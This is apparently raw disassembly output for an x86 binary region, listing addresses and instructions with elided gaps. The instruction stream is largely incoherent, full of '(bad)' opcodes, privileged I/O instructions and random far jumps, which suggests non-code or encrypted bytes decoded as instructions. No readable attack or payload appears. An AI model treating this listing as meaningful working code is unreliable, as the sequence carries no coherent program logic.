  42ab54:	sbb    DWORD PTR [ebp-0x7718718b],0x8f0f3ff3
  42ab5e:	shl    ebp,1
  42ab60:	or     DWORD PTR [eax],esp
  42ab62:	mov    cl,0xf2
  42ab64:	data16 mov cl,0x3b
  42ab67:	fucomp st(7)
  42ab69:	push   0x44e2a3a4
	...
  42abd6:	ds push cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	dec    ecx
  42abe3:	mov    bh,0x94
  42abe5:	mov    al,0x67
  42abe7:	retf   0x1
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	mov    edx,0x3c8da9cc
  42abf3:	xor    BYTE PTR [esi+0x32c22cd1],bh
  42abf9:	jmp    0x1fe2:0x580a1136
  42ac00:	sbb    DWORD PTR [eax+ebx*4+0x5008fb1d],esi
  42ac07:	stos   BYTE PTR es:[edi],al
  42ac08:	stos   DWORD PTR es:[edi],eax
  42ac09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac0a:	dec    esi
  42ac0b:	sub    esi,edx
  42ac0d:	retf   
  42ac0e:	sti    
  42ac0f:	ja     0x42ab93
  42ac11:	gs mov esi,0x2345414d
  42ac17:	nop
  42ac18:	cmp    esp,ecx
  42ac1a:	sahf   
  42ac1b:	jno    0x42abf3
  42ac1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac1e:	shr    BYTE PTR [edx-0xa],1
  42ac21:	jae    0x42ac2b
  42ac23:	addr16 inc ecx
  42ac25:	fadd   st,st(3)
  42ac27:	(bad)  
  42ac28:	dec    ebp
  42ac29:	shl    DWORD PTR [ecx],1
  42ac2b:	div    DWORD PTR [ecx+0x69]
  42ac2e:	ins    DWORD PTR es:[edi],dx
  42ac2f:	pop    ds
  42ac30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac31:	in     al,0x59
  42ac33:	lds    esi,FWORD PTR [edi-0x17]
  42ac36:	push   es
  42ac37:	mov    eax,ds:0xd25cc11b
  42ac3c:	retf   
  42ac3d:	jb     0x42ac11
  42ac3f:	(bad)  
  42ac40:	les    esi,FWORD PTR [edx+ecx*1]
  42ac43:	mov    edx,gs
  42ac45:	in     eax,0x61
  42ac47:	ins    BYTE PTR es:[edi],dx
  42ac48:	leave  
  42ac49:	xor    DWORD PTR [ebx],esi
  42ac4b:	call   0x237e9ec0
  42ac50:	cmp    esp,ebp
  42ac52:	sbb    ch,BYTE PTR [esi]
  42ac54:	mul    eax
  42ac56:	imul   esi,DWORD PTR ds:0x5ffddfb4,0x18ef0412
  42ac60:	lahf   
  42ac61:	push   esp
  42ac62:	xor    DWORD PTR [ebx+ebx*8-0x47ff58b2],ecx
  42ac69:	jg     0x42ac9e
  42ac6b:	(bad)  
  42ac6c:	jmp    0xf9fb:0x3166b030
  42ac73:	mov    WORD PTR [edi],cs
  42ac75:	mov    bl,0x87
  42ac77:	pop    edi
  42ac78:	xchg   ecx,eax
  42ac79:	dec    edi
  42ac7a:	push   ecx
  42ac7b:	sbb    eax,DWORD PTR [esi+0x46]
  42ac7e:	out    0x9b,eax
  42ac80:	xchg   dl,dl
  42ac82:	push   cs
  42ac83:	dec    esi
  42ac84:	fstp   TBYTE PTR [ecx+0x1f]
  42ac87:	adc    BYTE PTR [edx-0x7fb0b7d4],cl
  42ac8d:	xchg   edi,eax
  42ac8e:	addr16 pop esp
  42ac90:	setge  ah
  42ac93:	xchg   edi,eax
  42ac94:	pop    edi
  42ac95:	sti    
  42ac96:	pop    ss
  42ac97:	lods   al,BYTE PTR ds:[esi]
  42ac98:	push   edi
  42ac99:	iret   
  42ac9a:	dec    esp
  42ac9b:	push   0x51
  42ac9d:	outs   dx,DWORD PTR ds:[esi]
  42ac9e:	mov    cl,0xf1
  42aca0:	imul   ebx,DWORD PTR [edi-0x44f41c2e],0x941c4671
  42acaa:	mov    esi,0xaadf376a
  42acaf:	xor    ecx,DWORD PTR [ebx-0x3b]
  42acb2:	jne    0x42ac74
  42acb4:	aam    0x6e
  42acb6:	cmp    al,0xb3
  42acb8:	mov    edx,0x4ff3454f
  42acbd:	shl    edi,cl
  42acbf:	mov    ebp,0xf2c3ce9b
  42acc4:	cmc    
  42acc5:	ja     0x42ace3
  42acc7:	and    eax,0x3c988deb
  42accc:	xchg   al,al
  42acce:	mov    edx,0x65878060
  42acd3:	inc    ecx
  42acd4:	push   cs
  42acd5:	push   es
  42acd6:	xor    dl,BYTE PTR [edi+0x6]
  42acd9:	test   DWORD PTR [ebx+0x19f1594e],esp
  42acdf:	cmc    
  42ace0:	xchg   edx,eax
  42ace1:	fidivr WORD PTR [ebx+0x4b]
  42ace4:	lods   eax,DWORD PTR ds:[esi]
  42ace5:	ins    DWORD PTR es:[edi],dx
  42ace6:	or     eax,0xfefc3a8d
  42aceb:	call   0x4398ee
	...
  42ad54:	add    BYTE PTR [eax],al
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	cmp    DWORD PTR [ecx+ebp*2+0x2b],esp
  42ad66:	addr16 retf 
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	rcr    BYTE PTR [eax+eax*2+0x6aa306ec],0x2
  42ad76:	fwait
  42ad77:	in     al,dx
  42ad78:	push   esi
  42ad79:	test   DWORD PTR [eax+0x77],0x157f02bd
  42ad80:	xor    al,0x79
  42ad82:	iret   
  42ad83:	mov    bh,0xf7
  42ad85:	adc    eax,0x12fc1c92
  42ad8a:	in     al,0x15
  42ad8c:	add    al,0x81
  42ad8e:	rcl    DWORD PTR [edi+0x4f9c7ae],1
  42ad94:	xchg   DWORD PTR [ebx+ecx*1+0x41],eax
  42ad98:	lods   eax,DWORD PTR ds:[esi]
  42ad99:	jp     0x42ae08
  42ad9b:	rcl    bl,cl
  42ad9d:	xchg   ch,dl
  42ad9f:	retf   
  42ada0:	ret    
  42ada1:	add    al,0x4d
  42ada3:	xor    edi,0xffffffc7
  42ada6:	loope  0x42ad83
  42ada8:	pop    eax
  42ada9:	ss mov ebp,0xadf32617
  42adaf:	or     BYTE PTR [ebx-0x6c],dh
  42adb2:	pop    ecx
  42adb3:	std    
  42adb4:	jecxz  0x42adb9
  42adb6:	test   DWORD PTR [edx],edi
  42adb8:	and    eax,0x13d18f6
  42adbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42adbe:	retf   0xc70f
  42adc1:	jmp    0x22ade1c1
  42adc6:	loope  0x42adc1
  42adc8:	fadd   DWORD PTR [ebx+esi*2-0x2a]
  42adcc:	data16 daa 
  42adce:	cwde   
  42adcf:	cmp    BYTE PTR [ecx+0x54],0xe8
  42add3:	mov    al,0xb2
  42add5:	and    al,0xcd
  42add7:	mov    ds:0xe4dc8717,al
  42addc:	cld    
  42addd:	pop    ss
  42adde:	pusha  
  42addf:	inc    eax
  42ade0:	aam    0xd7
  42ade2:	call   0xd4dc:0xcc3e1547
  42ade9:	test   DWORD PTR [ebx],0x222fc6b7
  42adef:	dec    ecx
  42adf0:	mov    dh,0x67
  42adf2:	jo     0x42ae20
  42adf4:	out    dx,al
  42adf5:	add    dl,BYTE PTR [edi-0x25]
  42adf8:	aas    
  42adf9:	sahf   
  42adfa:	mov    bh,0x19
  42adfc:	fdiv   QWORD PTR [ecx-0x54258ea2]
  42ae02:	and    dh,ah
  42ae04:	xor    ah,BYTE PTR [ebx+0x2c]
  42ae07:	out    0x84,al
  42ae09:	shr    BYTE PTR [edi],1
  42ae0b:	ret    
  42ae0c:	inc    esp
  42ae0d:	dec    esi
  42ae0e:	mov    edx,0xb8aff812
  42ae13:	int    0x7e
  42ae15:	ins    DWORD PTR es:[edi],dx
  42ae16:	xor    bh,BYTE PTR cs:[esi-0x3b]
  42ae1a:	test   edi,eax
  42ae1c:	in     al,dx
  42ae1d:	(bad)
  42ae20:	pop    edx
  42ae21:	dec    esi
  42ae22:	xchg   ebx,eax
  42ae23:	(bad)  
  42ae24:	es push 0xfc66b05d
  42ae2a:	lock xor ah,BYTE PTR [esi]
  42ae2d:	pop    ebx
  42ae2e:	mov    edx,ebp
  42ae30:	ds inc eax
  42ae32:	sub    al,0x50
  42ae34:	mov    ss,WORD PTR [eax]
  42ae36:	xchg   ebx,eax
  42ae37:	jne    0x42ae2c
  42ae39:	es scas al,BYTE PTR es:[edi]
  42ae3b:	mov    dh,0x79
  42ae3d:	or     bl,BYTE PTR [ebx]
  42ae3f:	mov    dh,0xd9
  42ae41:	jmp    FWORD PTR [ebx]
  42ae43:	rol    DWORD PTR [ecx-0x44e1d68b],cl
  42ae49:	inc    eax
  42ae4a:	sbb    BYTE PTR [ebp+0x9aadd5e],cl
  42ae50:	mov    ah,0x4c
  42ae52:	push   edx
  42ae53:	test   BYTE PTR ds:0x27146b5b,bh
  42ae59:	dec    ebx
  42ae5a:	jbe    0x42ae9b
  42ae5c:	jno    0x42adf2
  42ae5e:	(bad)  
  42ae5f:	mov    ebp,0xb830a4ff
  42ae64:	add    dl,BYTE PTR [ecx+0x6148d29d]
  42ae6a:	inc    esi
  42ae6b:	call   0x42bb39
	...
  42aed4:	add    BYTE PTR [eax],al
  42aed6:	mov    edi,0x4a8e4af7
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	les    edx,FWORD PTR [ebx-0x63]
  42aee5:	push   ebp
  42aee6:	addr16 int3 
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	jno    0x42aedb
  42aef0:	rol    DWORD PTR [edi-0x3],cl
  42aef3:	imul   edi,DWORD PTR ds:0x73faad74,0xab08df8f
  42aefd:	aas    
  42aefe:	mov    eax,ds:0x1e8e4945
  42af03:	mov    DWORD PTR [edi+0xe19a65f],eax
  42af09:	lahf   
  42af0a:	sbb    BYTE PTR ds:0xd5d070a0,bl
  42af10:	loopne 0x42aeb9
  42af12:	outs   dx,BYTE PTR ds:[esi]
  42af13:	xrelease xchg BYTE PTR [eax+0x79],ah
  42af17:	sub    ch,BYTE PTR [eax-0x20]
  42af1a:	mov    ebx,0x7dee7800
  42af1f:	inc    esp
  42af20:	xor    al,0xa7
  42af22:	xor    esi,ebx
  42af24:	sysexit 
  42af26:	inc    edx
  42af27:	loope  0x42aef4
  42af29:	in     al,dx
  42af2a:	add    ebx,ebx
  42af2c:	shl    DWORD PTR [edx],0xb7
  42af2f:	add    al,dh
  42af31:	mov    cl,0xe6
  42af33:	push   esi
  42af34:	pusha  
  42af35:	mov    fs:0xba90207e,al
  42af3b:	jl     0x42af17
  42af3d:	pushf  
  42af3e:	nop
  42af3f:	jns    0x42aeef
  42af41:	imul   ebp,DWORD PTR [edi],0x39ddd0d7
  42af47:	(bad)  
  42af48:	fmul   DWORD PTR [ecx+esi*1]
  42af4b:	das    
  42af4c:	xchg   edx,eax
  42af4d:	fst    QWORD PTR [esi+0x53]
  42af50:	inc    ebp
  42af51:	and    eax,0xce8c88ec
  42af56:	and    ebp,DWORD PTR [eax]
  42af58:	mov    esi,0x3918027f
  42af5d:	outs   dx,DWORD PTR ds:[esi]
  42af5e:	add    dh,BYTE PTR [esi+0x2d]
  42af61:	mov    ecx,0x7c60f572
  42af66:	push   ecx
  42af67:	adc    dh,BYTE PTR [esi]
  42af69:	cmc    
  42af6a:	or     ah,BYTE PTR [eax+edi*1]
  42af6d:	mov    DWORD PTR ss:[eax+0x8],ebp
  42af71:	mov    eax,0xfdef978
  42af76:	lahf   
  42af77:	mov    DWORD PTR [ebx-0x3ec02c19],eax
  42af7d:	sbb    DWORD PTR [esi+0x14c69ea2],ebp
  42af83:	in     al,0xe
  42af85:	jo     0x42af3c
  42af87:	out    0xb,al
  42af89:	jge    0x42af57
  42af8b:	not    BYTE PTR [edx]
  42af8d:	mov    esp,0x87f7e783
  42af92:	xlat   BYTE PTR ds:[ebx]
  42af93:	pop    ebp
  42af94:	rcr    BYTE PTR [ecx],1
  42af96:	add    DWORD PTR [ebx-0x19],eax
  42af99:	pop    es
  42af9a:	(bad)
  42af9e:	jmp    0x14668d0
  42afa3:	and    DWORD PTR [esi],ebx
  42afa5:	clc    
  42afa6:	dec    edx
  42afa7:	mov    dh,0x26
  42afa9:	push   ecx
  42afaa:	sub    eax,0x47384a35
  42afaf:	les    ebx,FWORD PTR [eax+0x15]
  42afb2:	mov    ebx,0x29d55a0
  42afb7:	lahf   
  42afb8:	leave  
  42afb9:	sub    esi,ebp
  42afbb:	call   0x7689:0xd186cf89
  42afc2:	into   
  42afc3:	daa    
  42afc4:	fstp   DWORD PTR [edi+0x18]
  42afc7:	int    0xd6
  42afc9:	sbb    ah,BYTE PTR [ebx+0x5544c3c5]
  42afcf:	xor    ebx,ecx
  42afd1:	adc    BYTE PTR [ecx+0x5a],cl
  42afd4:	xor    ecx,DWORD PTR [eax+esi*2-0x6ff6c1a6]
  42afdb:	icebp  
  42afdc:	jmp    FWORD PTR [ebp-0x5e]
  42afdf:	jmp    0x1e66:0x4fac8913
  42afe6:	sbb    cl,al
  42afe8:	rol    DWORD PTR [ebp-0x3e],1
  42afeb:	icebp  
  42afec:	neg    DWORD PTR [ecx+0x0]
	...
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	xlat   BYTE PTR ds:[ebx]
  42b063:	fsub   st(5),st
  42b065:	xchg   esp,eax
  42b066:	addr16 int 0x1
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [ecx-0x2bbeac31],ah
  42b073:	dec    eax
  42b074:	xchg   esp,eax
  42b075:	add    dl,BYTE PTR [eax+0x28af5f88]
  42b07b:	dec    ebp
  42b07c:	adc    eax,0xad261266
  42b081:	popa   
  42b082:	pop    esp
  42b083:	fsubr  QWORD PTR [eax+0x29]
  42b086:	gs inc edi
  42b088:	shr    bl,0x50
  42b08b:	loope  0x42b0f4
  42b08d:	and    eax,0x752ece49
  42b092:	cli    
  42b093:	loop   0x42b04e
  42b095:	ret    0x72ee
  42b098:	dec    edx
  42b099:	icebp  
  42b09a:	and    edi,esi
  42b09c:	test   eax,0x54ff3caf
  42b0a1:	inc    ecx
  42b0a2:	jmp    0x42b101
  42b0a4:	cmp    dh,BYTE PTR [edx+0x252d1c79]
  42b0aa:	and    al,0x4b
  42b0ac:	or     edi,eax
  42b0ae:	or     al,0xf6
  42b0b0:	pushf  
  42b0b1:	scas   al,BYTE PTR es:[edi]
  42b0b2:	inc    ebx
  42b0b3:	aaa    
  42b0b4:	fimul  DWORD PTR [eax-0x6a]
  42b0b7:	jmp    0x3b23fbd4
  42b0bc:	mov    cl,0x68
  42b0be:	test   BYTE PTR [ebx+0x7c00561d],bl
  42b0c4:	jnp    0x42b101
  42b0c6:	pop    ds
  42b0c7:	mov    al,0x1a
  42b0c9:	mov    ds:0x5ded191f,eax
  42b0ce:	outs   dx,BYTE PTR ds:[esi]
  42b0cf:	fadd   QWORD PTR [eax-0x70]
  42b0d2:	fist   WORD PTR [esi+0x4f5a65ed]
  42b0d8:	rol    DWORD PTR [edx],0x96
  42b0db:	adc    BYTE PTR [ecx+0x3057dfb],0x76
  42b0e2:	or     eax,0x37732f63
  42b0e7:	mov    bh,0xd
  42b0e9:	sbb    eax,0x55a799ae
  42b0ee:	adc    eax,0x83b21068
  42b0f3:	test   al,0xac
  42b0f5:	(bad)  
  42b0f6:	(bad)  
  42b0f7:	mov    ch,0x9
  42b0f9:	repnz pop ecx
  42b0fb:	imul   esp,DWORD PTR [ebp-0x1e],0x10
  42b0ff:	scas   al,BYTE PTR es:[edi]
  42b100:	in     eax,0x91
  42b102:	shl    dh,cl
  42b104:	in     eax,0x26
  42b106:	outs   dx,DWORD PTR ds:[esi]
  42b107:	lock fdiv QWORD PTR [esi+0x2103d435]
  42b10e:	push   0x57
  42b110:	les    ebp,FWORD PTR [eax-0x6d40e205]
  42b116:	ins    BYTE PTR es:[edi],dx
  42b117:	sar    esi,cl
  42b119:	mov    esp,0xc6ab573d
  42b11e:	pop    eax
  42b11f:	das    
  42b120:	add    bl,al
  42b122:	add    al,0x84
  42b124:	jb     0x42b127
  42b126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b127:	ds fcmovne st,st(5)
  42b12a:	fisubr DWORD PTR ds:0x36f7666e
  42b130:	or     DWORD PTR [ebp-0x50],ebp
  42b133:	add    ch,BYTE PTR [ecx+eax*8-0x7bc1c6fa]
  42b13a:	in     al,0xe0
  42b13c:	xor    dh,bl
  42b13e:	xor    BYTE PTR [edx+eax*8+0xa227023],ch
  42b145:	shr    DWORD PTR [ebp+0x54],cl
  42b148:	jle    0x42b0cc
  42b14a:	push   ebp
  42b14b:	outs   dx,BYTE PTR ds:[esi]
  42b14c:	cld    
  42b14d:	test   DWORD PTR [edi+0x1c136a0d],ecx
  42b153:	dec    edi
  42b154:	frstor [edx+0x4b710ba5]
  42b15a:	test   eax,0x3fcf8de
  42b15f:	mov    ds:0xac6eb145,eax
  42b164:	(bad)  
  42b165:	iret   
  42b166:	scas   eax,DWORD PTR es:[edi]
  42b167:	xor    esi,DWORD PTR [ebx-0x4674e76b]
  42b16d:	cmp    eax,0x0
	...
  42b1d6:	jne    0x42b1fd
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	mov    esp,0x67b52375
  42b1e7:	into   
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	icebp  
  42b1ef:	inc    ebx
  42b1f0:	push   ecx
  42b1f1:	test   DWORD PTR [eax-0x34c86311],edx
  42b1f7:	push   ebx
  42b1f8:	cmp    esp,DWORD PTR [ebp+0x51197b36]
  42b1fe:	in     eax,0x76
  42b200:	pushf  
  42b201:	jae    0x42b1c6
  42b203:	add    ebx,DWORD PTR [esi]
  42b205:	adc    BYTE PTR [ebx-0x5d6cd3bc],bl
  42b20b:	(bad)  
  42b20c:	rsqrtps xmm3,XMMWORD PTR [ecx+0x6b9c6d9]
  42b213:	jo     0x42b20b
  42b215:	adc    ebx,DWORD PTR ds:0x95ef77cd
  42b21b:	cmp    al,0xed
  42b21d:	push   ebp
  42b21e:	repz ss sub edi,ecx
  42b222:	mov    BYTE PTR [eax+0x2b556854],ch
  42b228:	(bad)  
  42b229:	out    dx,al
  42b22a:	mov    ebp,0x8ebe5b1a
  42b22f:	dec    ecx
  42b230:	repz dec eax
  42b232:	dec    edx
  42b233:	mov    bl,0xde
  42b235:	xchg   ebx,eax
  42b236:	sbb    bl,cl
  42b238:	jo     0x42b21c
  42b23a:	jbe    0x42b1fd
  42b23c:	xlat   BYTE PTR ds:[ebx]
  42b23d:	into   
  42b23e:	mov    esp,0x57ace80
  42b243:	std    
  42b244:	xchg   ecx,eax
  42b245:	mov    ecx,0x203f0efc
  42b24a:	adc    eax,0xd7f3c97d
  42b24f:	sti    
  42b250:	data16 add BYTE PTR [ebx-0x4258f730],0x4a
  42b258:	mov    esp,0x8a74dcba
  42b25d:	mov    ebp,0x919330be
  42b262:	lea    esi,[eax-0x736fa146]
  42b268:	(bad)  
  42b269:	ja     0x42b23d
  42b26b:	or     eax,0x80a11764
  42b270:	cmp    eax,0x7edf1f2d
  42b275:	pop    eax
  42b276:	mov    BYTE PTR [ebp-0x4d20362a],dl
  42b27c:	dec    ecx
  42b27d:	pop    edx
  42b27e:	shl    al,cl
  42b280:	mov    eax,0xd0fc2f08
  42b285:	xor    DWORD PTR [di+0x3936],esp
  42b28a:	stc    
  42b28b:	fiadd  DWORD PTR [eax-0x5363e3b3]
  42b291:	icebp  
  42b292:	and    DWORD PTR [eax+0x3e],edi
  42b295:	enter  0x2f1f,0xb8
  42b299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b29a:	mov    eax,ds:0x1a998ea1
  42b29f:	jecxz  0x42b276
  42b2a1:	adc    al,bh
  42b2a3:	xchg   esi,eax
  42b2a4:	arpl   WORD PTR [edx],bp
  42b2a6:	cld    
  42b2a7:	lahf   
  42b2a8:	pop    eax
  42b2a9:	cmp    bl,BYTE PTR [ecx+0x6d]
  42b2ac:	push   0x3a
  42b2ae:	mov    bh,0x50
  42b2b0:	xchg   ebx,eax
  42b2b1:	or     ah,dl
  42b2b3:	mov    edi,DWORD PTR [ebx+0x31ed13da]
  42b2b9:	cmp    al,0xc6
  42b2bb:	inc    ebx
  42b2bc:	sbb    DWORD PTR [ebp-0x65],0x17e73332
  42b2c3:	das    
  42b2c4:	xchg   edx,eax
  42b2c5:	jge    0x42b263
  42b2c7:	sbb    al,0x17
  42b2c9:	xchg   BYTE PTR [ecx-0x19f20995],dl
  42b2cf:	aaa    
  42b2d0:	fcomi  st,st(4)
  42b2d2:	inc    edx
  42b2d3:	fidivr DWORD PTR [edx-0xf]
  42b2d6:	fwait
  42b2d7:	or     DWORD PTR [esi],esi
  42b2d9:	mov    gs,WORD PTR [edi]
  42b2db:	mov    al,ds:0x2469676
  42b2e0:	cld    
  42b2e1:	inc    edi
  42b2e2:	ins    DWORD PTR es:[edi],dx
  42b2e3:	mov    eax,0x9ebc78c2
  42b2e8:	fsub   DWORD PTR [eax-0x52de11ef]
	...
  42b356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b357:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b35d:	iret   
  42b35e:	sub    eax,0x3a738e65
  42b363:	imul   edx,ebx,0x1cf6754
  42b369:	add    BYTE PTR [eax],al
  42b36b:	add    DWORD PTR [eax],eax
  42b36d:	add    BYTE PTR [esi-0x5a],cl
  42b370:	aaa    
  42b371:	(bad)  
  42b373:	lds    edi,FWORD PTR [edi]
  42b375:	or     dh,BYTE PTR [edx+0x193be01c]
  42b37b:	xlat   BYTE PTR ds:[ebx]
  42b37c:	hlt    
  42b37d:	dec    edx
  42b37e:	aas    
  42b37f:	enter  0x387,0xba
  42b383:	jp     0x42b33e
  42b385:	mov    bl,0xf8
  42b387:	jg     0x42b38e
  42b389:	mov    bh,0x40
  42b38b:	xchg   ebp,eax
  42b38c:	fdivr  QWORD PTR [edx-0x51ddda48]
  42b392:	or     edx,ecx
  42b394:	cwde   
  42b395:	sbb    BYTE PTR ds:0x749ec5f8,bl
  42b39b:	out    0xb7,al
  42b39d:	sub    DWORD PTR [eax+0x17],0x4568f60d
  42b3a4:	jge    0x42b37e
  42b3a6:	int    0xe0
  42b3a8:	sbb    DWORD PTR [ebx-0x7],ebp
  42b3ab:	push   esi
  42b3ac:	jnp    0x42b332
  42b3ae:	stc    
  42b3af:	adc    BYTE PTR [edi+edx*1+0x57f1b2ae],ch
  42b3b6:	add    DWORD PTR [ebx-0x31],edi
  42b3b9:	sbb    eax,0x9d3e14c1
  42b3be:	or     ah,BYTE PTR [edx-0x51]
  42b3c1:	in     al,dx
  42b3c2:	mov    DWORD PTR [ebx+eax*1+0x4f],ebx
  42b3c6:	jmp    0xa342:0xf3b4eb17
  42b3cd:	jnp    0x42b448
  42b3cf:	retf   0x13b5
  42b3d2:	dec    ecx
  42b3d3:	mov    dl,0xa0
  42b3d5:	push   eax
  42b3d6:	pushf  
  42b3d7:	jne    0x42b426
  42b3d9:	dec    edx
  42b3da:	jo     0x42b3ba
  42b3dc:	fisub  WORD PTR [eax+0x63aae6ca]
  42b3e2:	loop   0x42b439
  42b3e4:	mov    edi,0x75f67534
  42b3e9:	or     ch,BYTE PTR [esi-0x79194b2]
  42b3ef:	ins    BYTE PTR es:[edi],dx
  42b3f0:	inc    esp
  42b3f1:	enter  0x21b6,0x92
  42b3f5:	mov    al,al
  42b3f7:	push   0x375ba60
  42b3fc:	out    0x5c,al
  42b3fe:	(bad)  [eax]
  42b400:	xchg   esi,eax
  42b401:	cmp    al,0x8e
  42b403:	xchg   DWORD PTR [ecx+0x5146fcf6],ebx
  42b409:	adc    cl,bl
  42b40b:	xchg   edx,eax
  42b40c:	pop    DWORD PTR ds:[eax+0x3d05c20c]
  42b413:	scas   al,BYTE PTR es:[edi]
  42b414:	jmp    0x3a7dd031
  42b419:	add    eax,DWORD PTR [ebx+0x65]
  42b41c:	pop    ds
  42b41d:	pushf  
  42b41e:	xchg   dl,dh
  42b420:	jle    0x42b450
  42b422:	sti    
  42b423:	dec    ebp
  42b424:	out    dx,eax
  42b425:	sub    ecx,DWORD PTR [esi]
  42b427:	add    BYTE PTR [ebx-0x5d],0x63
  42b42b:	mov    ch,0xa4
  42b42d:	pushf  
  42b42e:	mov    ds:0x16f504d2,eax
  42b433:	popf   
  42b434:	(bad)  
  42b435:	pusha  
  42b436:	int    0x12
  42b438:	cmp    edi,ebx
  42b43a:	retf   0x6bc0
  42b43d:	stc    
  42b43e:	repnz push 0x4
  42b441:	xchg   esp,eax
  42b442:	cmc    
  42b443:	add    eax,0x3954f95
  42b448:	push   edx
  42b449:	xor    BYTE PTR [esi-0x59],bh
  42b44c:	leave  
  42b44d:	arpl   WORD PTR [ebx-0x3891e98e],si
  42b453:	xor    BYTE PTR [ecx+ecx*1+0x3a7a506a],bl
  42b45a:	ja     0x42b492
  42b45c:	xor    BYTE PTR es:[edi-0x68],bl
  42b460:	and    eax,0x3daaf7a8
  42b465:	jle    0x42b490
  42b467:	loopne 0x42b4a2
  42b469:	ss adc bl,ch
  42b46c:	pushf  
  42b46d:	add    eax,0x0
	...
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [edx],esi
  42b4e3:	xor    eax,0xd06769a9
  42b4e8:	add    DWORD PTR [eax],eax
  42b4ea:	add    BYTE PTR [ecx],al
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	and    BYTE PTR [edx+esi*1],ah
  42b4f1:	pusha  
  42b4f2:	pusha  
  42b4f3:	pop    edi
  42b4f4:	(bad)  
  42b4f6:	out    0x2f,al
  42b4f8:	ret    
  42b4f9:	xchg   BYTE PTR [ebx-0x5673c109],bh
  42b4ff:	mov    edx,0x12775852
  42b504:	xor    al,0xd9
  42b506:	cld    
  42b507:	loop   0x42b4c9
  42b509:	mov    ah,0x4
  42b50b:	jmp    0xf45a:0x32f0989
  42b512:	mov    al,0xee
  42b514:	(bad)  
  42b515:	daa    
  42b516:	and    BYTE PTR [edi+esi*1+0x31],0x1
  42b51b:	stc    
  42b51c:	sahf   
  42b51d:	lds    ecx,FWORD PTR [esi+0x108a0ad1]
  42b523:	(bad)  
  42b524:	sub    edx,DWORD PTR gs:[edx-0x28]
  42b528:	adc    DWORD PTR [edx-0x4],ecx
  42b52b:	xchg   edi,eax
  42b52c:	xor    eax,0xb6d2a65f
  42b531:	pop    eax
  42b532:	nop
  42b533:	clc    
  42b534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b535:	jno    0x42b4cd
  42b537:	retf   0x9a23
  42b53a:	shl    BYTE PTR [edx+esi*4],1
  42b53d:	jb     0x42b4e0
  42b53f:	dec    ecx
  42b540:	mov    al,0x3d
  42b542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b543:	mov    ds:0x71cb4720,eax
  42b548:	push   es
  42b549:	repz jno 0x42b541
  42b54c:	mov    DWORD PTR [ecx+0x3b],eax
  42b54f:	adc    eax,0x125b5d8b
  42b554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b555:	ins    DWORD PTR es:[edi],dx
  42b556:	add    eax,0xaca4a82f
  42b55b:	push   eax
  42b55c:	call   0x66e4:0x5931e30c
  42b563:	test   DWORD PTR [ebx],ecx
  42b565:	(bad)  
  42b566:	cmp    eax,0xaa49a4a1
  42b56b:	or     BYTE PTR [esp+eiz*2],dh
  42b56e:	mov    al,ds:0x996f1fd7
  42b573:	outs   dx,DWORD PTR ds:[esi]
  42b574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b575:	popa   
  42b576:	sub    eax,0xf365aa03
  42b57b:	out    dx,al
  42b57c:	inc    esi
  42b57d:	ja     0x42b519
  42b57f:	(bad)  
  42b580:	push   ds
  42b581:	stos   BYTE PTR es:[edi],al
  42b582:	xor    al,cl
  42b584:	ret    
  42b585:	and    ecx,DWORD PTR [ebp-0x3c]
  42b588:	add    ebp,esp
  42b58a:	ss add ebp,ebp
  42b58d:	xchg   esp,eax
  42b58e:	es ret 
  42b590:	shl    cl,1
  42b592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b593:	cmp    ecx,DWORD PTR [esi-0x11]
  42b596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b597:	out    0x5e,al
  42b599:	js     0x42b53d
  42b59b:	aaa    
  42b59c:	leave  
  42b59d:	xor    DWORD PTR [eax],esi
  42b59f:	ins    BYTE PTR es:[edi],dx
  42b5a0:	xchg   BYTE PTR [edx+0x6adf826b],al
  42b5a6:	inc    ebx
  42b5a7:	ss aad 0x35
  42b5aa:	loope  0x42b546
